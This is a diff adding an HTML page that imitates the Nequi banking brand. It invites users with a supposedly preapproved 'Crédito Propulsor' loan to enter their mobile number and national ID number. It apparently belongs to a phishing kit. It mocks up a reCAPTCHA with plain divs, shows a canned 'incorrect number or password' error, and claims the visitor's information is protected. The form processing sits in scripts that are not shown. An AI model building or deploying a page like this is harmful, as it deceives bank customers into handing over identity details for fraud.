@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nequi - Crédito Propulsor</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="loading.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <header class="header">
+        <div class="header-container">
+            <!-- Reemplaza "logo.png" con el nombre de tu archivo si es diferente -->
+            <img src="img/logo.png" alt="Nequi" class="logo-nequi-header">
+            <button class="hamburger-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </button>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div id="error-message">
+            Número de celular o clave incorrectos.
+        </div>
+        <h1 class="title">Crédito Propulsor</h1>
+        <p class="subtitle">Si tienes un <span class="highlight">preaprobado</span>, valida tu identidad para continuar.</p>
+
+        <form class="login-form">
+            <div class="form-group">
+                <label for="celular">Número de Celular</label>
+                <input type="tel" id="celular" name="celular" placeholder="300 000 0000" maxlength="10" minlength="10" pattern="[0-9]*" inputmode="numeric">
+            </div>
+
+            <div class="form-group">
+                <label for="cedula">Cédula de Ciudadanía</label>
+                <input type="tel" id="cedula" name="cedula" placeholder="1234567890" pattern="[0-9]*" inputmode="numeric">
+            </div>
+
+            <div class="recaptcha-box">
+                <div class="recaptcha-content">
+                    <div class="recaptcha-checkbox"></div>
+                    <span class="recaptcha-text">No soy un robot</span>
+                </div>
+                <div class="recaptcha-logo">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <span class="recaptcha-terms">reCAPTCHA</span>
+                    <span class="recaptcha-links">Privacidad - Términos</span>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-submit" disabled>Entra</button>
+        </form>
+
+        <div class="security-note">
+            <svg class="security-icon" viewBox="0 0 24 24" width="24" height="24" fill="currentColor">
+                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
+            </svg>
+            <span>Tu información está protegida</span>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-logos">
+                <img src="img/logo.png" alt="Nequi" class="logo-nequi-footer">
+                <img src="img/grupobancolombia.png" alt="Grupo Bancolombia" class="logo-bancolombia">
+            </div>
+            
+            <div class="app-badges">
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Disponible en Google Play"></a>
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="Consíguelo en el App Store"></a>
+            </div>
+        </div>
+    </footer>
+    <script src="loading.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
